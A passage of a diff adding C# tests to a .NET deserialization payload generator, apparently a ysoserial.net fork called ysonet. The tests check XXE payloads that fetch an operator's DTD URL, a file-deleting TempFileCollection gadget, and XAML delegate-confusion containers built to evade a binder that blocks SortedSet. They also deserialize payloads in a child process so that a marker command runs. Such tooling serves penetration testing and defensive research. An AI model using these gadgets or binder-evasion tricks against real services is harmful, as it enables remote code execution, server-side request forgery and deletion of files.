+            return bytes == null ? null : new UTF8Encoding(false).GetString(bytes);
+        }
+
+        // The integrity check: every advertised formatter must actually name the
+        // DataViewManager carrier, target the DataViewSettingCollectionString setter, and
+        // carry a DOCTYPE whose external parameter entity points at the operator's URL.
+        private static void DataViewManagerXxeCarriesTheRealCarrierAndDoctype()
+        {
+            foreach (string formatter in DvmXxeFormatters)
+            {
+                RunResult r = GenerateDvmXxe(formatter, false, DvmXxeUrl);
+                AssertTrue(r.Success, formatter + " generates: " + r.ErrorMessage);
+
+                string text = DvmXxePayloadText(r.Raw);
+                AssertTrue(text != null, formatter + ": payload is text or bytes");
+
+                // XAML names the carrier as an element plus a clr-namespace; every other
+                // formatter carries the assembly-qualified name.
+                if (formatter == "Xaml")
+                {
+                    AssertTrue(text.IndexOf("<DataViewManager ", StringComparison.Ordinal) >= 0
+                            && text.IndexOf("clr-namespace:System.Data;assembly=System.Data", StringComparison.Ordinal) >= 0,
+                        formatter + ": names the DataViewManager carrier");
+                }
+                else
+                {
+                    AssertTrue(text.IndexOf("System.Data.DataViewManager", StringComparison.Ordinal) >= 0,
+                        formatter + ": names the DataViewManager carrier");
+                }
+                AssertTrue(text.IndexOf("DataViewSettingCollectionString", StringComparison.Ordinal) >= 0,
+                    formatter + ": targets the DataViewSettingCollectionString setter");
+
+                // The inner XML is escaped for the outer syntax, so compare against the
+                // decoded form the target will hand to XmlTextReader.
+                string decoded = DecodeForFormatter(formatter, text);
+                AssertTrue(decoded.IndexOf("<!DOCTYPE DataViewSettingCollectionString", StringComparison.Ordinal) >= 0,
+                    formatter + ": carries a DOCTYPE using the root name the setter expects");
+                AssertTrue(decoded.IndexOf("<!ENTITY % remote SYSTEM \"" + DvmXxeUrl + "\">", StringComparison.Ordinal) >= 0,
+                    formatter + ": declares the external parameter entity at the operator URL");
+                AssertTrue(decoded.IndexOf("%remote;", StringComparison.Ordinal) >= 0,
+                    formatter + ": references the parameter entity, which is what forces the fetch");
+            }
+        }
+
+        // Undo only the escaping the payload template applied, so the assertions above can
+        // look at the XML the setter will really parse.
+        private static string DecodeForFormatter(string formatter, string payload)
+        {
+            if (formatter == "Xaml" || formatter == "SharpSerializerXml")
+                return payload.Replace("&#x22;", "\"").Replace("&quot;", "\"")
+                              .Replace("&lt;", "<").Replace("&gt;", ">").Replace("&amp;", "&");
+            if (formatter == "JavaScriptSerializer" || formatter == "FastJson")
+                return payload.Replace("\\\"", "\"").Replace("\\\\", "\\");
+            return payload; // SharpSerializerBinary stores the string verbatim
+        }
+
+        private static void DataViewManagerXxeValidatesTheDtdUrl()
+        {
+            // Rejected: nothing to fetch, or a character that would break out of (or
+            // corrupt) the quoted DTD external identifier.
+            foreach (string bad in new[]
+            {
+                null,
+                "",
+                "   ",
+                "http://127.0.0.1/a\"b.dtd",      // ends the SystemLiteral
+                "http://127.0.0.1/a<b.dtd",
+                "http://127.0.0.1/a>b.dtd",
+                "http://127.0.0.1/a\\b.dtd",
+                "http://127.0.0.1/a b.dtd",       // whitespace
+                "http://127.0.0.1/a\tb.dtd",
+                "http://127.0.0.1/a\nb.dtd",
+                "/relative/x.dtd",                // not absolute
+                "127.0.0.1/x.dtd",
+                "file:///C:/windows/win.ini",     // not a fetch this gadget claims
+                "ftp://127.0.0.1/x.dtd",
+                "jar:http://127.0.0.1/x.dtd",
+            })
+            {
+                string captured = bad;
+                AssertThrows(delegate { DataViewManagerXxeGenerator.ValidateDtdUrl(captured); },
+                    "rejects DTD URL '" + (captured ?? "<null>") + "'");
+            }
+
+            // Accepted: '&' and '%' are literal inside a SystemLiteral (it recognises
+            // neither entity nor parameter-entity references), so an ordinary query string
+            // and percent-encoding must survive.
+            const string query = "https://example.test:8443/a%20b.dtd?x=1&y=2";
+            AssertEqual(query, DataViewManagerXxeGenerator.ValidateDtdUrl(query),
+                "keeps a percent-encoded query-string URL verbatim");
+            AssertEqual(DvmXxeUrl, DataViewManagerXxeGenerator.ValidateDtdUrl("  " + DvmXxeUrl + "  "),
+                "trims surrounding whitespace");
+
+            // And it must survive generation into a real payload.
+            RunResult r = GenerateDvmXxe("Xaml", false, query);
+            AssertTrue(r.Success, "generates with a query-string URL: " + r.ErrorMessage);
+            string decoded = DecodeForFormatter("Xaml", DvmXxePayloadText(r.Raw));
+            AssertTrue(decoded.IndexOf("SYSTEM \"" + query + "\"", StringComparison.Ordinal) >= 0,
+                "the query-string URL reaches the DTD external identifier unchanged");
+        }
+
+        // --minify rewrites XML and JSON payloads. It must not break the DOCTYPE, the
+        // parameter entity, or the URL, because those are the payload. Verified, not
+        // predicted (see the minification note in .claude/memory/gadgets.md).
+        private static void DataViewManagerXxeMinifyKeepsTheDoctype()
+        {
+            foreach (string formatter in DvmXxeFormatters)
+            {
+                RunResult r = GenerateDvmXxe(formatter, true, DvmXxeUrl);
+                AssertTrue(r.Success, formatter + " generates minified: " + r.ErrorMessage);
+
+                string decoded = DecodeForFormatter(formatter, DvmXxePayloadText(r.Raw));
+                AssertTrue(decoded.IndexOf("<!DOCTYPE DataViewSettingCollectionString", StringComparison.Ordinal) >= 0,
+                    formatter + " --minify: the DOCTYPE survives");
+                AssertTrue(decoded.IndexOf("<!ENTITY % remote SYSTEM \"" + DvmXxeUrl + "\">", StringComparison.Ordinal) >= 0,
+                    formatter + " --minify: the parameter entity and URL survive intact");
+                AssertTrue(decoded.IndexOf("%remote;", StringComparison.Ordinal) >= 0,
+                    formatter + " --minify: the parameter entity reference survives");
+            }
+        }
+
+        private static void DataViewManagerXxeDeclaresUrlInputAndNetworkKind()
+        {
+            IGenerator g = GadgetRegistry.CreateGadgetInstance("DataViewManagerXxe");
+            AssertTrue(g != null, "DataViewManagerXxe is discoverable in the registry");
+            AssertEqual(CommandInputType.Url, g.CommandInput(),
+                "-c is a URL, so the editor and help describe it as one");
+
+            AssertTrue(g.AdditionalInfo().IndexOf("4.5.2", StringComparison.Ordinal) >= 0,
+                "AdditionalInfo names the pre-4.5.2 resolver condition that actually gates it");
+
+            List<GadgetCapability> caps = GadgetFacetReader.Expand(g);
+            AssertEqual(1, caps.Count, "no variants, so exactly one capability unit");
+            GadgetCapability cap = caps[0];
+
+            AssertTrue(cap.Kinds.Contains(PayloadKind.Network),
+                "declares the network kind: a fetched DTD is SSRF evidence");
+            AssertTrue(!cap.Kinds.Contains(PayloadKind.InformationDisclosure),
+                "does NOT claim information disclosure: the setter never returns entity text");
+            AssertTrue(cap.Requirements.Contains(GadgetRequirement.BuiltIn)
+                    && cap.Requirements.Contains(GadgetRequirement.NetFramework),
+                "needs only built-in .NET Framework types");
+
+            // The gate is a target-framework/config decision, not a CLR build, so the
+            // version axis stays unspecified and AdditionalInfo carries the real condition.
+            AssertEqual(1, cap.Versions.Count, "declares one value on the version axis");
+            AssertTrue(cap.Versions.Contains(RuntimeVersion.Unspecified),
+                "leaves the runtime version axis unspecified");
+
+            AssertTrue(cap.Inputs.Contains(PayloadInput.RemoteUrl),
+                "the derived accepted input is remote-url");
+        }
+
+        // Every advertised formatter sets the property BY NAME. The excluded ones are
+        // excluded for one of two structural reasons, and both are worth locking so a
+        // later "let's add Json.NET" is caught here rather than shipped as a dead cell.
+        private static void DataViewManagerXxeAdvertisesOnlySetterFormatters()
+        {
+            IGenerator g = GadgetRegistry.CreateGadgetInstance("DataViewManagerXxe");
+            List<string> advertised = g.SupportedFormatters();
+
+            foreach (string expected in DvmXxeFormatters)
+                AssertTrue(advertised.Contains(expected), "advertises " + expected);
+            AssertEqual(DvmXxeFormatters.Length, advertised.Count,
+                "advertises exactly the proven setter-calling formatters");
+
+            // Contract-inferring serializers see DataViewManager's IList/IEnumerable and
+            // build a COLLECTION contract, so the property setter is never called.
+            // Field-based serializers never call a setter at all, and DataViewManager is
+            // not [Serializable] either.
+            foreach (string impossible in new[]
+            {
+                "Json.NET", "YamlDotNet", "DataContractSerializer", "NetDataContractSerializer",
+                "XmlSerializer", "DataContractJsonSerializer", "MessagePackTypeless",
+                "MessagePackTypelessLz4", "BinaryFormatter", "SoapFormatter", "LosFormatter",
+                "FsPickler",
+            })
+            {
+                AssertTrue(!advertised.Contains(impossible),
+                    impossible + " cannot call the setter, so it must not be advertised");
+                AssertTrue(!g.IsSupported(impossible), impossible + " is rejected by IsSupported");
+            }
+
+            // DataViewManager really does implement the collection interface that rules the
+            // first group out - the reason, not just the outcome.
+            Type carrier = Type.GetType(
+                "System.Data.DataViewManager, System.Data, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089");
+            AssertTrue(carrier != null, "the DataViewManager carrier type resolves");
+            AssertTrue(typeof(System.Collections.IList).IsAssignableFrom(carrier),
+                "DataViewManager implements IList, which is why contract inference builds a collection");
+            AssertTrue(!carrier.IsSerializable,
+                "DataViewManager is not [Serializable], which rules out the runtime formatters");
+        }
+
+        private static void TempFileCollectionKeepsUncAndRelativePathsVerbatim()
+        {
+            const string unc = @"\\ysonet-nonexistent-host\share\zz_target.txt";
+            const string relative = @"zz_relative\target.txt";
+            const string trailingDot = @"C:\ysonet\dir.\file.txt";
+
+            foreach (string formatter in TempFilesFormatters)
+            {
+                RunResult r = GenerateTempFiles(formatter, false, false, unc, relative, trailingDot);
+                AssertTrue(r.Success, formatter + " generates UNC + relative paths: " + r.ErrorMessage);
+                WithDeserializedTempFileCollection(formatter, r.Raw, delegate (object obj)
+                {
+                    var table = TempFilesTableOf(obj);
+                    AssertEqual(3, table.Count, formatter + ": all three paths arrived");
+                    AssertTrue(table.ContainsKey(unc), formatter + ": the UNC path is unchanged");
+                    AssertTrue(table.ContainsKey(relative),
+                        formatter + ": the relative path is NOT rooted against ysonet's directory");
+                    AssertTrue(table.ContainsKey(trailingDot),
+                        formatter + ": a path Path.GetFullPath would rewrite is left alone");
+                });
+            }
+        }
+
+        // -t must be REFUSED, not ignored, and the refusal has to happen before anything can
+        // deserialize: a self-test here would build a real TempFileCollection holding the
+        // operator's paths inside ysonet.exe and let its finalizer delete them. The proof is
+        // a real file that is still there afterwards, plus a forced collection in between.
+        private static void TempFileCollectionRefusesSelfTest()
+        {
+            string victim = WriteTestArtifact("ysonet_tfc_selftest_victim.txt", "must survive -t");
+            try
+            {
+                foreach (string formatter in TempFilesFormatters)
+                {
+                    RunResult r = GenerateTempFiles(formatter, false, true, victim);
+                    AssertTrue(!r.Success, formatter + " with -t is refused");
+                    AssertTrue((r.ErrorMessage ?? "").Contains("-t"),
+                        "the refusal names -t: " + r.ErrorMessage);
+                    AssertTrue(r.Raw == null, "a refused run returns no payload");
+                }
+
+                // If a live instance had been created and dropped, this is where it would
+                // delete the file. It must not.
+                GC.Collect();
+                GC.WaitForPendingFinalizers();
+                GC.Collect();
+                AssertTrue(File.Exists(victim),
+                    "the refusal happened before anything could construct the target type");
+                AssertEqual("must survive -t", File.ReadAllText(victim), "the file is untouched");
+            }
+            finally { SafeDelete(victim); }
+        }
+
+        // This gadget DELETES the path it carries, so it must never ship a REWRITTEN one. Two
+        // separate things rewrite a path in an XML payload: the minifier (deliberately not text
+        // preserving) and, with no minification at all, the DataContractSerializer helper's XML
+        // writer, which emits a carriage return raw so every parser normalizes it away.
+        //
+        // The invariant asserted here is the one that matters and does not go stale: whenever
+        // generation SUCCEEDS the path must arrive intact, and whenever it fails the message
+        // must name the formatter and point at a formatter that does carry it. On top of that,
+        // the known refusals and the known-safe cases are locked so the guard is proven live
+        // rather than merely present.
+        private static void TempFileCollectionRefusesAPathItWouldRewrite()
+        {
+            // A trailing space and a carriage return are both legal in a Windows path (an NTFS
+            // name can end in a space, and a path reached through the device namespace can hold
+            // odd characters), so the gadget cannot assume nobody passes one.
+            var lossy = new[] { @"C:\ysonet\trailing space ", "C:\\ysonet\\has\rcr.txt" };
+            var safe = new[] { @"C:\ysonet\plain.txt", @"C:\ysonet\two  spaces.txt" };
+
+            foreach (string formatter in TempFilesFormatters)
+            {
+                bool isXml = Array.IndexOf(TempFilesXmlFormatters, formatter) >= 0;
+                int refusals = 0;
+
+                foreach (string path in lossy)
+                {
+                    foreach (bool minify in new[] { false, true })
+                    {
+                        string label = formatter + (minify ? " --minify" : "") + " " + Preview(path);
+                        RunResult r = GenerateTempFiles(formatter, minify, false, path);
+                        if (r.Success)
+                        {
+                            // The invariant: a shipped payload names exactly what was asked for.
+                            WithDeserializedTempFileCollection(formatter, r.Raw, delegate (object obj)
+                            {
+                                AssertTrue(TempFilesTableOf(obj).ContainsKey(path),
+                                    label + " generated, so it must deliver the path intact");
+                            });
+                        }
+                        else
+                        {
+                            refusals++;
+                            AssertTrue((r.ErrorMessage ?? "").Contains(formatter),
+                                "the refusal names the formatter: " + r.ErrorMessage);
+                            AssertTrue((r.ErrorMessage ?? "").Contains("BinaryFormatter"),
+                                "the refusal offers a formatter that does carry it: " + r.ErrorMessage);
+                            AssertTrue((r.ErrorMessage ?? "").Contains("deletes the path it carries"),
+                                "the refusal says why it matters: " + r.ErrorMessage);
+                        }
+
+                        // Minified XML is the known-lossy combination and must always refuse.
+                        if (isXml && minify)
+                            AssertTrue(!r.Success, "minified " + formatter + " is refused for "
+                                + Preview(path));
+                        if (isXml && minify)
+                            AssertTrue((r.ErrorMessage ?? "").Contains("cannot use --minify with " + formatter),
+                                "the minify refusal names the combination: " + r.ErrorMessage);
+
+                        // A binary formatter has no XML to rewrite, so it must never refuse.
+                        if (!isXml)
+                            AssertTrue(r.Success, formatter + " carries " + Preview(path)
+                                + " (there is no XML to rewrite): " + r.ErrorMessage);
+                    }
+                }
+
+                if (isXml)
+                    AssertTrue(refusals > 0, formatter + " exercised the path-fidelity refusal");
+                else
+                    AssertEqual(0, refusals, formatter + " never refuses a path");
+
+                // A path the writer and the minifier both leave alone always generates.
+                foreach (string path in safe)
+                {
+                    foreach (bool minify in new[] { false, true })
+                    {
+                        RunResult r = GenerateTempFiles(formatter, minify, false, path);
+                        AssertTrue(r.Success, formatter + (minify ? " --minify" : "")
+                            + " is allowed for an ordinary path (" + Preview(path) + "): "
+                            + r.ErrorMessage);
+                    }
+                }
+            }
+
+            // The un-minified DataContractSerializer carriage-return case is the writer-level
+            // half of this rule, so lock it explicitly: it is the reason the check does not
+            // only run under --minify.
+            RunResult writerCase = GenerateTempFiles("DataContractSerializer", false, false,
+                "C:\\ysonet\\has\rcr.txt");
+            AssertTrue(!writerCase.Success,
+                "un-minified DataContractSerializer refuses a carriage return its writer loses");
+            AssertTrue((writerCase.ErrorMessage ?? "").Contains("XML writer"),
+                "the writer-level refusal names the cause: " + writerCase.ErrorMessage);
+        }
+
+        // ---- TypeConfuseDelegate XAML-path containers (--rootcontainer) -------------
+        //
+        // GetXamlGadget is the same delegate confusion with XamlReader.Parse in slot 1, and
+        // it now offers the same three roots. Its two consumers, the hosted gadgets below,
+        // expose the choice as --rootcontainer. That option is ORTHOGONAL to their --variant,
+        // which picks the WRAPPER (TypeConfuseDelegate or TextFormattingRunProperties), so
+        // it is a plain option and not a variant.
+
+        private static readonly string[] XamlContainerGadgets =
+            { "ActivitySurrogateDisableTypeCheck", "XamlAssemblyLoadFromFile" };
+
+        // The option name comes from the generator, so a rename cannot leave the tests
+        // asserting a flag nobody types.
+        private static readonly string RootContainerOption =
+            TypeConfuseDelegateGenerator.XamlRootContainerOptionName;
+        private static readonly string RootContainerFlag = "--" + RootContainerOption;
+
+        // Formatters variant 1 (the TypeConfuseDelegate wrapper) advertises. SoapFormatter is
+        // absent on purpose: every container is a generic type (see
+        // XamlContainersCannotUseSoapFormatter).
+        private static readonly string[] XamlContainerFormatters =
+            { "BinaryFormatter", "NetDataContractSerializer", "LosFormatter" };
+
+        // Pass container=null for the implicit default (no --rootcontainer).
+        private static RunResult GenerateXamlContainer(string gadget, string cmd, int variant,
+            int? container, string formatter, bool minify)
+        {
+            InputArgs ia = new InputArgs();
+            ia.Cmd = cmd;
+            ia.Test = false;
+            ia.Minify = minify;
+            var extra = new List<string> { "--variant", variant.ToString() };
+            if (container.HasValue) { extra.Add(RootContainerFlag); extra.Add(container.Value.ToString()); }
+            ia.ExtraArguments = extra;
+            return PayloadRunner.GenerateGadget(new GenerationRequest
+            {
+                GadgetName = gadget,
+                FormatterName = formatter,
+                OutputFormat = "",
+                InputArgs = ia,
+            });
+        }
+
+        // Adding the container selector must not change the default payload: with no option,
+        // each consumer must produce the exact same bytes as an explicit --rootcontainer 1.
+        private static void XamlContainerDefaultEqualsContainerOne()
+        {
+            // ActivitySurrogateDisableTypeCheck ignores -c, so the whole formatter x minify
+            // grid is cheap here.
+            foreach (string formatter in XamlContainerFormatters)
+            {
+                for (int m = 0; m < 2; m++)
+                {
+                    bool minify = m == 1;
+                    string desc = "ActivitySurrogateDisableTypeCheck -f " + formatter + (minify ? " (minify)" : "");
+
+                    RunResult def = GenerateXamlContainer("ActivitySurrogateDisableTypeCheck", "calc.exe", 1, null, formatter, minify);
+                    RunResult one = GenerateXamlContainer("ActivitySurrogateDisableTypeCheck", "calc.exe", 1, 1, formatter, minify);
+                    AssertTrue(def.Success, "implicit default generates: " + desc + " -> " + def.ErrorMessage);
+                    AssertTrue(one.Success, "explicit --rootcontainer 1 generates: " + desc + " -> " + one.ErrorMessage);
+                    AssertTrue(BytesEqual(Bytes(def.Raw), Bytes(one.Raw)),
+                        "implicit default equals explicit --rootcontainer 1 byte-for-byte: " + desc);
+
+                    // The other two containers must actually produce a DIFFERENT payload,
+                    // otherwise the option would be silently ignored.
+                    foreach (int container in new[] { 2, 3 })
+                    {
+                        RunResult other = GenerateXamlContainer("ActivitySurrogateDisableTypeCheck", "calc.exe", 1, container, formatter, minify);
+                        AssertTrue(other.Success, "--rootcontainer " + container + " generates: " + desc + " -> " + other.ErrorMessage);
+                        AssertTrue(!BytesEqual(Bytes(def.Raw), Bytes(other.Raw)),
+                            "--rootcontainer " + container + " changes the payload: " + desc);
+                    }
+                }
+            }
+
+            // The shared entry point both consumers call: the no-container overload must build
+            // exactly the container-1 graph, so no caller of the old signature changes a byte.
+            string xaml = "<x>" + new string('a', 64) + "</x>";
+            AssertTrue(BytesEqual(BfBytes(TypeConfuseDelegateGenerator.GetXamlGadget(xaml)),
+                                  BfBytes(TypeConfuseDelegateGenerator.GetXamlGadget(xaml, 1))),
+                "GetXamlGadget(xaml) equals GetXamlGadget(xaml, 1) byte-for-byte");
+
+            // XamlAssemblyLoadFromFile is deliberately NOT exercised here. It compiles the -c
+            // .cs on every generation, and a CodeDom compile is the one step that can wedge on
+            // this platform (antivirus + the legacy CSharpCodeProvider), so the normal tier
+            // keeps as few compiles as possible. It also cannot be byte-compared across two
+            // runs: each compile carries a fresh module id, so two identical requests differ.
+            // Its container wiring is asserted on the wire SHAPE in the FULL tier, next to the
+            // cells that already compile (XamlContainerFullMatrix).
+        }
+
+        // The container option must reject anything that is not 1, 2, or 3 instead of quietly
+        // falling back to the default, which would hide a typo behind a payload the user did
+        // not ask for. The rejection happens while parsing the options, so it costs nothing
+        // even on the consumer that compiles a .cs.
+        private static void XamlContainerOptionIsValidated()
+        {
+            foreach (string gadget in XamlContainerGadgets)
+            {
+                foreach (string bad in new[] { "nope", "0", "4", "-1", "" })
+                {
+                    InputArgs ia = new InputArgs();
+                    ia.Cmd = "ysonet_no_such_fixture.cs";
+                    ia.Test = false;
+                    ia.ExtraArguments = new List<string> { RootContainerFlag, bad };
+                    RunResult r = PayloadRunner.GenerateGadget(new GenerationRequest
+                    {
+                        GadgetName = gadget,
+                        FormatterName = "BinaryFormatter",
+                        OutputFormat = "",
+                        InputArgs = ia,
+                    });
+                    AssertTrue(!r.Success, gadget + " " + RootContainerFlag + " " + bad + " is rejected");
+                    AssertTrue((r.ErrorMessage ?? "").IndexOf(RootContainerOption + " must be 1, 2, or 3", StringComparison.OrdinalIgnoreCase) >= 0,
+                        gadget + " " + RootContainerFlag + " " + bad + " reports the allowed values: " + r.ErrorMessage);
+                }
+            }
+
+            foreach (int good in new[] { 1, 2, 3 })
+                AssertTrue(GenerateXamlContainer("ActivitySurrogateDisableTypeCheck", "calc.exe", 1, good, "BinaryFormatter", false).Success,
+                    "--rootcontainer " + good + " is accepted");
+        }
+
+        // The point of containers 2 and 3 is the wire type names, so assert them directly on
+        // the BinaryFormatter stream: the chosen root must be present and the SortedSet name
+        // must be gone, while the XamlReader.Parse primitive stays put in all three.
+        private static void XamlContainerRootsAvoidSortedSetName()
+        {
+            const string sortedSet = "System.Collections.Generic.SortedSet`1";
+            const string treeSet = "System.Collections.Generic.TreeSet`1";
+            const string sortedDict = "System.Collections.Generic.SortedDictionary`2";
+
+            string c1 = XamlContainerStreamText(1);
+            AssertTrue(c1.Contains(sortedSet), "container 1 still serializes a SortedSet root");
+
+            string c2 = XamlContainerStreamText(2);
+            AssertTrue(c2.Contains(sortedDict), "container 2 serializes a SortedDictionary root");
+            AssertTrue(c2.Contains(treeSet), "container 2 carries the inner TreeSet backing set");
+            AssertTrue(c2.Contains("KeyValuePairComparer"),
+                "container 2 carries the KeyValuePairComparer that forwards key comparisons");
+            AssertTrue(!c2.Contains(sortedSet), "container 2 emits no SortedSet type record");
+
+            string c3 = XamlContainerStreamText(3);
+            AssertTrue(c3.Contains(treeSet), "container 3 serializes a TreeSet root");
+            AssertTrue(!c3.Contains(sortedDict), "container 3 does not wrap the set in a dictionary");
+            AssertTrue(!c3.Contains(sortedSet), "container 3 emits no SortedSet type record");
+
+            foreach (var pair in new[] { new[] { "1", c1 }, new[] { "2", c2 }, new[] { "3", c3 } })
+            {
+                AssertTrue(pair[1].Contains("System.DelegateSerializationHolder"),
+                    "container " + pair[0] + " still carries the delegate serialization holder");
+                AssertTrue(pair[1].Contains("System.Windows.Markup.XamlReader"),
+                    "container " + pair[0] + " still targets XamlReader");
+                AssertTrue(pair[1].Contains("Parse"),
+                    "container " + pair[0] + " still targets the Parse method");
+            }
+        }
+
+        // The raw BinaryFormatter bytes of one container, read as ASCII so the embedded type
+        // name records can be searched. ActivitySurrogateDisableTypeCheck ignores -c, so this
+        // needs no compile.
+        private static string XamlContainerStreamText(int container)
+        {
+            RunResult r = GenerateXamlContainer("ActivitySurrogateDisableTypeCheck", "calc.exe", 1, container, "BinaryFormatter", false);
+            AssertTrue(r.Success, "--rootcontainer " + container + " generates: " + r.ErrorMessage);
+            return Encoding.ASCII.GetString(Bytes(r.Raw));
+        }
+
+        // The behavioral proof, which the byte-name assertions alone cannot give: through a
+        // binder that rejects only the exact SortedSet wire name, container 1 is blocked and
+        // never parses its XAML, while containers 2 and 3 deserialize and hand the document to
+        // XamlReader.Parse, which runs it.
+        //
+        // It also proves the ordering the whole XAML path depends on: the spliced method
+        // receives the LARGER-sorting element as its first argument, and "" always sorts
+        // smaller than a XAML document, so Parse gets the document - in every container.
+        //
+        // Every deserialization runs in a CHILD process. Parsing this XAML inside a
+        // BinaryFormatter callback makes the CLR fail-fast (0xC0000409 in clr.dll) after the
+        // payload has already fired - the same reason the *FromFile fire helpers use a
+        // subprocess. The marker file is the proof, independent of the child's exit code.
+        private static void XamlContainersEvadeSortedSetBinder()
+        {
+            // Blocked: the binder rejects the SortedSet root, so nothing parses. Asserting an
+            // ABSENCE, so it keeps a short bound instead of the full marker budget.
+            AssertTrue(!XamlContainerProbeFires(1, true, "c1_blocked", 3000),
+                "container 1 does not parse its XAML when its root type is blocked");
+
+            foreach (int container in new[] { 2, 3 })
+                AssertTrue(XamlContainerProbeFires(container, true, "c" + container, MarkerWaitMs),
+                    "container " + container + " parses its XAML through a binder that rejects the SortedSet wire name");
+
+            // Control: container 1 DOES parse when nothing blocks it, so the absence above is
+            // the binder's doing and not a dud payload.
+            AssertTrue(XamlContainerProbeFires(1, false, "c1_control", MarkerWaitMs),
+                "container 1 parses its XAML when no binder blocks it");
+        }
+
+        private const string XamlContainerProbeVar = "YSONET_XAML_CONTAINER_PROBE";
+
+        // Spawn this same test exe in probe mode and report whether the payload fired.
+        private static bool XamlContainerProbeFires(int container, bool useBinder, string tag, int waitMs)
+        {
+            string exe = System.Reflection.Assembly.GetEntryAssembly().Location;
+            AssertTrue(!string.IsNullOrEmpty(exe) && File.Exists(exe),
+                "the test exe can spawn itself for the XAML container probe");
+
+            string marker = MarkerPath("XAMLTCD_binder_" + tag);
+            SafeDelete(marker);
+            try
+            {
+                var psi = new System.Diagnostics.ProcessStartInfo(exe);
+                psi.UseShellExecute = false;
+                psi.CreateNoWindow = true;
+                psi.RedirectStandardOutput = true;
+                psi.RedirectStandardError = true;
+                psi.WorkingDirectory = Path.GetDirectoryName(exe);
+                psi.EnvironmentVariables[XamlContainerProbeVar] =
+                    container + "|" + (useBinder ? "1" : "0") + "|" + marker;
+                using (var proc = System.Diagnostics.Process.Start(psi))
+                {
+                    proc.OutputDataReceived += delegate { };
+                    proc.ErrorDataReceived += delegate { };
+                    proc.BeginOutputReadLine();
+                    proc.BeginErrorReadLine();
+                    if (!proc.WaitForExit(40000)) { try { proc.Kill(); } catch { } }
+                }
+                return WaitForFile(marker, waitMs);
+            }
+            finally { SafeDelete(marker); }
+        }
+
+        // The child half of the probe: build one XAML-container payload whose XAML drops the
+        // marker, deserialize it on an STA thread (with or without the blocking binder), and
+        // exit. The process may fail-fast inside the CLR after firing; the parent reads the
+        // marker, never the exit code.
+        private static int XamlContainerProbe(string spec)
+        {
+            string[] parts = spec.Split('|');
+            int container = int.Parse(parts[0]);
+            bool useBinder = parts[1] == "1";
+            string marker = parts[2];
+
+            byte[] payload = BfBytes(TypeConfuseDelegateGenerator.GetXamlGadget(MarkerXaml(marker), container));
+            RunSTA(delegate
+            {
+                if (useBinder)
+                {
+                    DeserializeWithBinder(payload, new SortedSetNameBlockingBinder());
+                }
+                else
+                {
+                    var bf = new System.Runtime.Serialization.Formatters.Binary.BinaryFormatter();
+                    using (var ms = new MemoryStream(payload)) bf.Deserialize(ms);
+                }
+            });
+            // Give the spawned "cmd /c echo" a moment before this process goes away.
+            System.Threading.Thread.Sleep(500);
+            return 0;
+        }
+
+        // A XAML document that drops a marker file when parsed: the ObjectDataProvider
+        // ResourceDictionary payload, the same shape both consumers carry.
+        private static string MarkerXaml(string marker)
+        {
+            InputArgs ia = new InputArgs();
+            ia.Cmd = MarkerCommand(marker);
+            ia.IsRawCmd = true;
+            ia.Test = false;
+            var gen = new ObjectDataProviderGenerator();
+            gen.Options().Parse(new[] { "--variant", "2" });
+            return (string)gen.Generate("xaml", ia);
+        }
+
+        // The container belongs to the TypeConfuseDelegate wrapper only. With the
+        // TextFormattingRunProperties wrapper (variant 2) there is no sorted container at all,
+        // so the option is accepted and simply ignored - it must never change those bytes.
+        private static void XamlContainerIsIgnoredByTheTfrpWrapper()
+        {
+            foreach (string formatter in new[] { "BinaryFormatter", "SoapFormatter" })
+            {
+                RunResult plain = GenerateXamlContainer("ActivitySurrogateDisableTypeCheck", "calc.exe", 2, null, formatter, false);
+                AssertTrue(plain.Success, "the TFRP wrapper generates on " + formatter + ": " + plain.ErrorMessage);
+
+                foreach (int container in new[] { 1, 2, 3 })
+                {
+                    RunResult withContainer = GenerateXamlContainer("ActivitySurrogateDisableTypeCheck", "calc.exe", 2, container, formatter, false);
+                    AssertTrue(withContainer.Success,
+                        "the TFRP wrapper accepts --rootcontainer " + container + " on " + formatter + ": " + withContainer.ErrorMessage);
+                    AssertTrue(BytesEqual(Bytes(plain.Raw), Bytes(withContainer.Raw)),
+                        "--rootcontainer " + container + " does not change the TFRP wrapper payload on " + formatter);
+                }
+            }
+        }
+
+        // Formatter-expansion result, locked as a test instead of left as an assumption. The
+        // container swap does not widen the formatter set of these consumers: all three roots
+        // are GENERIC types (SortedSet`1, SortedDictionary`2, TreeSet`1) and SoapFormatter
+        // cannot serialize a generic type, so variant 1 stays opted out for every container.
+        // Asserted rather than silently omitted, so a framework or serializer change that
+        // lifts the limitation says so here.
+        private static void XamlContainersCannotUseSoapFormatter()
+        {
+            foreach (string gadget in XamlContainerGadgets)
+            {
+                foreach (int container in new[] { 1, 2, 3 })
+                {
+                    // The variant+formatter guard runs before any .cs compile, so this stays
+                    // cheap for XamlAssemblyLoadFromFile too.
+                    RunResult r = GenerateXamlContainer(gadget, "ysonet_no_such_fixture.cs", 1, container, "SoapFormatter", false);
+                    AssertTrue(!r.Success,
+                        gadget + " variant 1 + --rootcontainer " + container + " cannot use SoapFormatter");
+                    AssertTrue((r.ErrorMessage ?? "").IndexOf("is not supported by variant 1", StringComparison.OrdinalIgnoreCase) >= 0,
+                        gadget + " --rootcontainer " + container + " reports the variant opt-out: " + r.ErrorMessage);
+                }
+            }
+        }
+
+        // The root container is a plain gadget option, exactly like ObjectDataProvider's
+        // --xamlurl: it must NOT appear as a variant, must start unset (so the default
+        // payload is unchanged), and must reach the echoed command line as
+        // --rootcontainer N.
+        private static void EditorExposesTheXamlContainerOption()
+        {
+            foreach (string gadget in XamlContainerGadgets)
+            {
+                AssertEqual(2, Gadget(gadget).Variants().Count,
+                    gadget + " still declares two WRAPPER variants (the container is not one)");
+
+                var ed = new ModuleEditor(null, null, true, null, null);
+                var fields = ed.BuildFieldsForTest(gadget);
+
+                EditableField container = FindEditable(fields, RootContainerOption);
+                AssertTrue(container != null, "the " + RootContainerOption + " setting is offered for " + gadget);
+                AssertTrue(container.ModuleOwn, "the " + RootContainerOption + " setting belongs to " + gadget);
+
+                EditableField variant = FindEditable(fields, "variant");
+                AssertTrue(variant != null && !ReferenceEquals(variant, container),
+                    "the container is a separate setting from the wrapper variant (" + gadget + ")");
+                AssertTrue(string.IsNullOrEmpty(container.Value),
+                    "the container starts unset, so the default payload stays the shipped one (" + gadget + ")");
+
+                EditableField command = FindEditable(fields, "command");
+                if (command != null) command.Value = "calc.exe";
+
+                container.Value = "3";
+                string line = ed.GadgetCommandLineForTest();
+                AssertTrue(line.Contains(RootContainerFlag + " 3"),
